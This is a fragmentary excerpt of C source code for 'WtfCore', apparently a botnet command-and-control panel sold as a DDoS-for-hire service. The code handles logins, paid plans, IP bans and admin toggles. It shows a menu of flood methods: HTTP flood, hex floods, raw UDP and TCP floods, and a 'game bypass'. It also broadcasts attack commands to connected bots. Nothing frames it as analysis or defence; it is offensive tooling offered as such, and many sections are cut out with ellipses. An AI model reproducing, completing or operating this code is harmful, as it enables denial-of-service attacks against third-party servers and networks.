...
static struct login accounts[100]; // Перенести static сюда
	...
	while(seconds-- >= closesecs)
		{
			if(seconds == 1800)
			{
				...
				sprintf(sadtimes, "\r\n\e[38;2;134;10;240m %s@WtfCore~# \e[0m", managements[datafd].id);
				send(datafd, sadtimes, strlen(sadtimes), MSG_NOSIGNAL);
			}
...
void attacktime(void *arguments) {
    ...
    attacksrunning++;
    Sending[fd].attacktimeleft = seconds;
	...
	void *TitleWriter(void *sock) {
		...
		while(1) {
			...
			if(gay[datafd].login == 2) {
				sprintf(string, "%c]0; Welcome To ⚡WtfCore, Please Login %c", '\033', '\007');
			} else {
				sprintf(string, 
					"%c]0; ⚡WtfCore | Bots: %d | Account: %s | Active Attacks: %d %c", 
					'\033', 
					botsconnect(), 
			...
			send(datafd, string, strlen(string), MSG_NOSIGNAL);
			sleep(2);
		}
	}
...
void *BotWorker(void *sock)
{
    ...
    while(j!=i-1) {
        ...
        FILE *f1 = fopen("logs/IPBANNED.txt", "r");
            while (getline(&line1, &n1, f1) != -1){
                if (strstr(line1, ipinfo) != NULL){
                    sprintf(botnet, "\e[38;5;190mYour IP was banned! Write t.me/wtfcore_support!\r\n");
        ...
        if(check_expiry(datafd) == 1)
        {
            ...
            printf("[WtfCore]:%s's Account Has Expired\r\n", accounts[find_line].username);
            sleep(5);
            goto end;
        }
        gay[datafd].login = 0;
		...
		pthread_create(&title, NULL, &TitleWriter, sock);
				...
				for(loginshit=0;loginshit<MAXFDS;loginshit++)
				{
					if(gay[datafd].just_logged_in == 0 && managements[loginshit].LoginListen == 1 && managements[loginshit].connected == 1 && loggedin == 0)
					{
						...
						printf(usethis, "[WtfCore]:%s Plan: [%s] Just Logged In!\r\n", managements[datafd].id, managements[datafd].planname);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;2;134;10;240m %s@WtfCore~# \e[0m", managements[loginshit].id);
						if(send(loginshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
				...
				sprintf(banner0,  "\e[38;2;200;100;255m██╗    ██╗████████╗███████╗ ██████╗ ██████╗ ██████╗ ███████╗ \r\n");
				sprintf(banner1,  "\e[38;2;200;100;255m██║    ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝\r\n");
				sprintf(banner2,  "\e[38;2;200;100;255m██║ █╗ ██║   ██║   █████╗  ██║     ██║   ██║██████╔╝█████╗\r\n");
				sprintf(banner3,  "\e[38;2;200;100;255m██║███╗██║   ██║   ██╔══╝  ██║     ██║   ██║██╔══██╗██╔══╝  \r\n");
				sprintf(banner4,  "\e[38;2;200;100;255m╚███╔███╔╝   ██║   ██║     ╚██████╗╚██████╔╝██║  ██║███████╗\r\n");
				sprintf(banner5,  "\e[38;2;200;100;255m ╚══╝╚══╝    ╚═╝   ╚═╝      ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝ \r\n");
				sprintf(banner6,  "\e[38;2;200;100;255m              🚀 Welcome to WtfCore 🚀\r\n", accounts[find_line].username);						
		...
		while(fdgets(buf, sizeof buf, datafd) > 0) {
            ...
            if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
					...
					pthread_create(&title, NULL, &TitleWriter, sock);
					char input [5000];
        			sprintf(input, "\r\n\e[38;2;134;10;240m %s@WtfCore~#  \e[0m", accounts[find_line].username);
            ...
            if(send(datafd, banner0,  strlen(banner0),	MSG_NOSIGNAL) == -1) goto end;
				...
				sprintf(attack0,   "\r\n   \e[38;2;119;34;192m═══ \e[38;2;211;181;236mLAYER 7 METHODS \e[38;2;119;34;192m═══\r\n");
				sprintf(attack1,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* http_flood <target.com> <port> <time> \e[38;2;119;34;192m## Http Flooder\r\n");

				sprintf(attack2,   "\r\n   \e[38;2;119;34;192m═══ \e[38;2;211;181;236mLAYER 4 METHODS \e[38;2;119;34;192m═══\r\n");
				sprintf(attack3,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* std <target ip> <port> <time>      \e[38;2;119;34;192m## STD hex flood\r\n");
				sprintf(attack4,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* randhex <target ip> <port> <time>  \e[38;2;119;34;192m## Random hex flood\r\n");
				sprintf(attack5,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* udpraw <target ip> <port> <time>   \e[38;2;119;34;192m## Raw UDP flood\r\n");
				sprintf(attack6,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* game <target ip> <port> <time>     \e[38;2;119;34;192m## Game bypass\r\n");
				sprintf(attack7,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* xtd <target ip> <port> <time>      \e[38;2;119;34;192m## Custom hex flood\r\n");
				sprintf(attack8,   "   \e[38;2;119;34;192m> \e[38;2;211;181;236m!* tcpraw <target ip> <port> <time>   \e[38;2;119;34;192m## Raw TCP flood\r\n");
 			...
 			if(strcasestr(buf, "ToggleListen"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(managements[datafd].listenattacks == 0)
 					{
 						...
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[WtfCore]:%s Is Listening To Attacks\n", managements[datafd].id);
 					}
 					else if(managements[datafd].listenattacks == 1)
 					{
 						...
 						if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
 						printf("[WtfCore]:%s Is No Longer Listening To Attacks\n", managements[datafd].id);
 					}
 				} else {
					char sendbuf[50];
 			...
 			else if(strcasestr(buf, "ToggleAttacks"))
 			{
 				if(managements[datafd].adminstatus == 1)
 				{
 					if(AttackStatus == 0)
 					{
        	        			...
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[WtfCore]:%s Has Toggled OFF Attacks\n", managements[datafd].id);
        	        			AttackStatus = 1;
 					} else {
        	        			sprintf(usethis, "\e[38;5;190mAttacks Have Been Toggled ON\r\n");
        	        			if(send(datafd, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
        	        			printf("[WtfCore]:%s Has Toggled ON Attacks\n", managements[datafd].id);
        	        			AttackStatus = 0;
 					}
 				} else {
					char sendbuf[50];
            			...
            			if(Sending[datafd].amountofatks <= managements[datafd].mymaxattacks)
            			{
                			...
                			else if(atoi(argv[4]) > managements[datafd].mymaxtime)
                			{
								...
								/* THIS IS A TEST AND IT WORKS*/
										  ...
										  broadcast(buf, 0, "lol");
            					printf("[WtfCore]:\e[38;5;190m%s\e[1;31m: Sent A %s Attack To: %s For: %d Seconds\r\n", managements[datafd].id, argv[1], argv[2], atoi(argv[4]));
	...
	if(send(datafd, input, strlen(input), MSG_NOSIGNAL) == -1) goto end;
				...
				for(logoutshit=0;logoutshit<MAXFDS;logoutshit++)
				{
					if(managements[logoutshit].LoginListen == 1 && managements[logoutshit].connected == 1 && loggedin == 0)
					{
						...
						printf("[WtfCore]:%s Plan: [%s] Just Logged Out!\n", managements[datafd].id, managements[datafd].planname);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
						sprintf(usethis, "\e[38;2;134;10;240m %s@WtfCore~# \e[0m", managements[logoutshit].id);
						if(send(logoutshit, usethis, strlen(usethis), MSG_NOSIGNAL) == -1) goto end;
					}
				}
		loggedin = 1;
